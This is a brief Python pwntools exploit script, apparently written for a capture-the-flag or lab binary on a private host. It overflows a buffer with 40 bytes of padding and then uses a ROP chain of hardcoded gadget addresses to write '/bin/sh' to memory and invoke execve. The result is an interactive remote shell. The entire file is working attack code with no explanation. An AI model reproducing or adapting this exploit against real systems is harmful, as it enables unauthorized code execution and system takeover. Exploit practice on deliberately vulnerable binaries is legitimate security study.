#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)

r.recvuntil(":")

# execve("/bin/sh",NULL,NULL)
buf = 0x6cbf00
mov_drdi_rsi = 0x000000000047a682
pop_rdi = 0x00000000004014e6
pop_rsi = 0x0000000000401607
pop_rdx = 0x00000000004428f6
pop_rax_rdx_rbx = 0x0000000000478696 
syscall = 0x00000000004672c5

raw_input()
rop = flat([pop_rdi,buf,pop_rsi,"/bin/sh\x00",mov_drdi_rsi,pop_rdi,buf,pop_rsi,0,pop_rax_rdx_rbx,0x3b,0,0,syscall])
payload = "a"*40 + rop
r.sendline(payload)
r.interactive()
